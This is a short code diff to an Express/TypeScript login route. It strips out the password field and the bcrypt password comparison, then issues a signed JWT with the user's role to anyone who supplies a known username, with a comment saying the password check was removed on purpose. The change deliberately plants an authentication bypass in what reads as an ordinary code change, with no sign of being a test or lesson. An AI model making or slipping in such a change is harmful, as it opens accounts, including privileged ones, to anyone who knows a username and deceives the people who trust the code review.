@@ -6,21 +6,17 @@ import prisma from '../db';
 const router = express.Router();
 
 router.post('/login', async (req: Request, res: Response) => {
-  const { username, password } = req.body;
-  if (!username || !password) {
-    res.status(400).json({ message: 'Username and password required' });
+  const { username } = req.body;
+  if (!username) {
+    res.status(400).json({ message: 'Username required' });
     return;
   }
-  const user = await prisma.user.findUnique({ where: { name: username } });
+  const user = await prisma.user.findFirst({ where: { name: username } });
   if (!user) {
     res.status(401).json({ message: 'Invalid credentials' });
     return;
   }
-  const valid = await bcrypt.compare(password, user.passwordHash);
-  if (!valid) {
-    res.status(401).json({ message: 'Invalid credentials' });
-    return;
-  }
+  // Password check removed: allow login for any known username
   const token = jwt.sign(
     { userId: user.id, role: user.role },
     process.env.JWT_SECRET as string,
